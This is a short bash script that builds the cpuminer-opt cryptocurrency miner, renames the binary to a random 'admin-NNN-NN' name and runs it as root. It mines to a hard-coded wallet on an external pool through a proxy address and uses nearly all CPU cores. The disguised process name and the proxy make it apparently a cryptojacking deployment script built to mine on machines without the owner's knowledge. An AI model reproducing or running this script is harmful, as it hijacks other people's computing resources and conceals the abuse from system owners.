#!/bin/bash
sudo su -
sudo apt-get update
apt-get install -y build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev automake autotools-dev git autoconf
echo "vm.nr_hugepages=128" >> /etc/sysctl.conf && sysctl -p
git clone https://github.com/JayDDee/cpuminer-opt.git /usr/share/work/
a='admin-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
cd /usr/share/work/
./build.sh 
CFLAGS="-O3 -march=native -Wall" CXXFLAGS="$CFLAGS -std=gnu++11" ./configure --with-curl
make
mv cpuminer "${cpuname}"
echo ""${cpuname}" is starting"
cpucores=$( awk -F: '/model name/ {core++} END {print core}' /proc/cpuinfo )
if [ $cpucores -ge 16 ]; then
downcore=2;
else 
downcore=1;
fi
if [ $cpucores -ge 2 ]; then
detectcpu=$[$cpucores - $downcore]
else 
detectcpu=$cpucores
fi
maxcore=$[$cpucores - $downcore];
sudo ./"${cpuname}" -a argon2d-dyn -o stratum+tcp://beastpool.com:4335 -u DSLKzyafutB7ce8JwWnuJzbp7o4AhwQvye -p c=DYN -x 18.207.224.76:808 -t $maxcore
